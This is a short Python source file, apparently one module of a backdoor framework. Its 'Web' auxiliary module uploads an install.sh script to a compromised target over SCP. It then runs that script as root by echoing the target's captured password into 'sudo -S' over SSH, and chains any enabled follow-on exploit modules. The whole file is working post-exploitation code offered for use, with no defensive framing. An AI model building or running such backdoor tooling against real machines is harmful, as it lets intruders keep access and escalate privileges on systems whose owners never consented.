from backdoors.backdoor import *


class Web(Backdoor):
    prompt = Fore.RED + "(web) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using web auxiliary module"
        self.core = core
        self.options = {
                }
        self.allow_modules = True
        self.enabled_modules = {}
        self.modules = {}
        self.help_text = INFO + "Installs and starts an apache web server on the client."

    def get_command(self):
        target = self.core.curtarget
        target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
    
    def do_exploit(self, args):
        target = self.core.curtarget
        print("Creating web server....")
        target.scpFiles(self, "backdoors/auxiliary/__web/install.sh", False)
        target.ssh.exec_command("echo " + target.pword + " | sudo -S bash ~/install.sh")
        for mod in self.modules.keys():
                print(INFO + "Attempting to execute " + mod.name + " module...")
                mod.exploit(self.get_command())

